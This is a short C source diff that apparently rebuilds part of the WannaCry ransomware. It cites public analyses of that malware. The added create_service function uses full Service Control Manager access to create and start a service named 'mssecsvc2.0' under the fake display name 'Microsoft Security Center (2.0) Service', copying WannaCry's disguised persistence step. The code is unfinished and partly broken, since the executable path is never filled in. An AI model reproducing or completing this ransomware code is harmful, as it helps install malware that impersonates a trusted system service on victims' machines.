@@ -4,6 +4,11 @@
 //Video: https://www.youtube.com/watch?v=Sv8yu12y5zM
 //Video: https://www.youtube.com/watch?v=Q90uZS3taG0
 //Video: https://www.youtube.com/watch?v=ru5VzUigKqw
+//Help from:
+//https://tech-zealots.com/threat-lab/dissecting-wannacry-ransomware-to-its-core-technical-analysis/
+//https://www.youtube.com/watch?v=Sv8yu12y5zM
+//https://www.microsoft.com/security/blog/2017/05/12/wannacrypt-ransomware-worm-targets-out-of-date-systems/
+//https://blogs.windows.com/russia/2017/05/17/windows-vs-wannacrypt/
 
 #include <stdlib.h>
 #include <Windows.h>
@@ -12,7 +17,26 @@
 
 int create_service()
 {
-
+    SC_HANDLE hSCManager;
+    SC_HANDLE hService;
+    char executable_path[MAX_PATH]; //Get executable path 
+    char exec_with_args[260];
+    
+    sprintf(exec_with_args, "%s -m security", executable_path);
+    hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if(hSCManager != NULL)
+    {
+        //Fix this
+        hService = CreateServiceA(hSCManager,"mssecsvc2.0", "Microsoft Security Center (2.0) Service", 0xf01ff, 16, 2, 1, exec_with_args, NULL, NULL, NULL, NULL, NULL );
+        if(hService != NULL)
+        {
+            StartServiceA(hService, 0, NULL);
+            CloseServiceHandle(hService);
+        }
+        CloseServiceHandle(hSCManager);
+        return 0;
+    }
+       return 0;
 }
 
 int no_argument_handler()
